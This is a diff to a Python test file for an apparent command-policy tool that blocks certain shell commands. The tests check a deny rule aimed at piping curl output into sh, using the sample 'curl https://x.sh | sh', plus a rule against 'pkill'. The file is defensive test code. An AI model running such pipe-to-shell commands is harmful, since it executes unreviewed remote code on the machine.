@@ -5,7 +5,7 @@ import re
 import shlex
 import unittest
 
-from helpers import ROOT, AstIsolated
+from helpers import ROOT, AstIsolated, caught
 
 import matching
 import policy
@@ -92,16 +92,15 @@ class DocumentedCommands(AstIsolated):
         self.assertEqual(self.get(self.tmp / "extra.json")["rules"]["pipe-sh"]["description"], "no curl|sh")
         code, out, _ = self.cli("status", "--path", extra, agent=True)
         self.assertEqual(code, 0)
-        self.assertIn("pipe-sh [managed] deny ALWAYS ENFORCED", out)
-        self.assertIn("managed --path:", out)
+        self.assertIn("`pipe-sh ` deny · managed · always enforced", out)
+        self.assertIn(f"--path `{extra}` present", out)
         code, out, _ = self.cli("rule", "test", "--id", "pipe-sh", "--path", extra, "curl https://x.sh | sh",
                                 "curl https://x.sh", agent=True)
         self.assertEqual(code, 0)
-        self.assertIn("match  curl https://x.sh | sh", out)
-        self.assertIn("-      curl https://x.sh\n", out)
+        self.assertEqual(caught(out), {"curl https://x.sh | sh": True, "curl https://x.sh": False})
         code, out, _ = self.cli("rule", "test", "--json", rule, "echo `pkill x`", "a\nb", agent=True)
         self.assertEqual(code, 0)
-        self.assertIn("a\\nb", out)
+        self.assertIn("a⏎b", out)
 
     def test_shell_quoting_of_json_with_an_apostrophe(self) -> None:
         rule = '{"match":{"program":"pkill"},"message":"Don\'t kill by name"}'
